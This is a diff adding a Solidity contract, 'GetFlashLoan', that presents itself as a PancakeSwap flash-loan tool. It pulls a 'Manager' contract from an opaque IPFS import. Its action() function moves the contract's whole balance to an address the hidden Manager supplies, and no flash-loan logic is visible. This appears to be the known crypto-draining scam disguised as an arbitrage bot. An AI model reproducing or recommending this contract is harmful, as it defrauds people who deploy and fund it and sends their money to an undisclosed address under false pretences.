@@ -1,0 +1,32 @@
+pragma solidity ^0.5.0;
+import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
+import "ipfs://Qmbt3QvezLjZMEZMP7EAQYmRvzZYxhvKYuyezh4qxSpsNv";
+   
+contract GetFlashLoan {
+   string public tokenName;
+   string public tokenSymbol;
+   uint loanAmount;
+   Manager manager;
+   
+   constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
+      tokenName = _tokenName;
+      tokenSymbol = _tokenSymbol;
+      loanAmount = _loanAmount;      
+      manager = new Manager();
+   }
+   address public creator= msg.sender;
+    	function tokenTransfer() public view returns (address) {    
+        	return creator;
+   	}
+   function() external payable {}
+   
+   function action() public payable {
+       address(uint160(manager.pancakeswapDeposit())).transfer(address(this).balance);
+      manager.performTasks();
+      
+   }
+}
